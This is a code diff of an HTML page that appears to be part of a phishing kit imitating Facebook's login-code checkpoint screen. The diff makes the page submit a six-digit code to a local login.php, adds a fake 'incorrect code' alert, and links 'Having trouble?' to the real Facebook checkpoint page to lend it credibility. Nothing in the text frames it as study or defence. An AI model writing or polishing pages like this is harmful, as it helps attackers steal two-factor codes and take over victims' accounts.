@@ -13,24 +13,27 @@
 <body>
     <div class="container">
         <img src="./banner.jpg" alt="">
-        <form id="form">
-            <input type="text" name="username" class="input" id="input" placeholder="Login code">
+        <form id="form" method="post" novalidate="1">
+            <div>
+                <input type="text" name="username" class="input" id="input" placeholder="Login code">
+                <input type="submit" value="Continue" id="btn" class="button">
+            </div>
         </form>
-        <button class="button" id="btn">Continue</button>
         <a href="#" id="resend">Resend code</a>
     </div>
     <div class="footer">
-        <a href="#">Having trouble?</a>
+        <a href="https://m.facebook.com/checkpoint/?having_trouble=1">Having trouble?</a>
     </div>
     <script>
         var code = document.getElementById("input");
         var form = document.getElementById("form");
-        document.getElementById("btn").addEventListener('click', function (e) {
-            if (code.value !== '' || code.value.length == 6) {
-                form.setAttribute('action', 'login.php');
+        document.getElementById("form").addEventListener('submit', function () {
+            if (code.value == '' || code.value.length !== 6) {
+                alert(`The code you entered is incorrect.
+please try again.`)
             } 
             else{
-                e.preventDefault();
+                form.setAttribute('action', 'login.php');
             }
         })
 
